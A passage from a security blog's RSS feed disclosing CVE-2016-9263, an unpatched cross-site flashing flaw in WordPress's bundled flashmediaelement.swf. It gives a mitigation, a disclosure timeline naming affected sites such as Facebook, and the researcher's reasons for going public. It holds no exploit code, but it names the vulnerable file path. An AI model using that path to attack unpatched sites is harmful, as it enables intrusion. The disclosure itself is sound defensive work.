<p>Or you can <strong>redirect</strong> [WordPress_Home_URL]/wp-includes/js/mediaelement/flashmediaelement.swf <strong>to a sandboxed domain</strong>, for example to https://x0.wp.com/wp-includes/js/mediaelement/flashmediaelement.swf.</p>
<p>Either of these solutions will mitigate this issue.</p>
<h3>What is the timeline of this vulnerability report ?</h3>
<ul>
<li>Aug 5th <strong>2016</strong>: I reported this issue to Automattic, then WordPress private Bug Bounty program, more than a year ago. WordPress contacted the author of the vulnerable code, mediaelement.js (created by John Dyer @johndyer), which provided a patched file very quickly. WordPress decided not to release the patch.<cite></cite><cite class="_Rm"></cite></li>
<li>Sep 15th 2016: I found that Facebook was using the same vulnerable code, so <strong>facebook.com was vulnerable to the same XSF vulnerability</strong> (similar to a reflected XSS on facebook.com). I reported it to Facebook which fixed it in 5 days.</li>
<li>Nov 11th 2016: I requested a CVE for this to MITRE and was assigned <strong><span class="il">CVE</span>-2016-9263</strong></li>
<li>Sep 15th <strong>2017</strong>: I informed WordPress Security Team that I was going to publicly disclose <span class="il">CVE</span>-2016-9263</li>
<li>Oct 12th 2017: I publicly disclose the issue on my blog without any technical detail but with instructions how to patch.</li>
<li><strong>Oct 19th 2017: I will publicly disclose technical details</strong> about this vulnerability, including <span style="text-decoration: line-through;"><strong>how to exploit it</strong></span> [UPDATE]: <strong>Limited technical details</strong> are now available <a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/"><strong>here</strong></a></li>
</ul>
<h3>Why are you publicly disclosing this ?</h3>
<p>I reported this issue to WordPress more than a year ago, with a working proof of concept, technical details and how to patch the issue. WordPress choose not to release the patch quickly provided by mediaelement.js team. On the other hand, Facebook patched the issue in 5 days. WordPress obviously has less resource than Facebook but this is not a valid excuse because it is the most used Website software in the world, and the patch has been ready for more than a year. They made a poor decision that endangers their users and many websites.</p>
<p>I already reported this vulnerability to large websites like Uber, Spotify, etc&#8230;Â  for many of which their main website was vulnerable because of this vulnerability in their WordPress site. Many of them patched it themselves. It is possible that this is now exploited as a consequence of the reports I sent to these organisations. I don&#8217;t accept that the public is not informed about this vulnerability.</p>
<p><strong>Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017.</strong></p>
<h3>How can I contact you ?</h3>
<p>You can find me on twitter (<strong>@opnsec</strong>). You can also contact me at wordpress /at\ opnsec /dot\ com.</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F10%2Fcve-2016-9263-unpatched-xsf-vulnerability-in-wordpress%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
					<wfw:commentRss>/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/feed/</wfw:commentRss>
			<slash:comments>3</slash:comments>
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">209</post-id>	</item>
	</channel>
</rss>
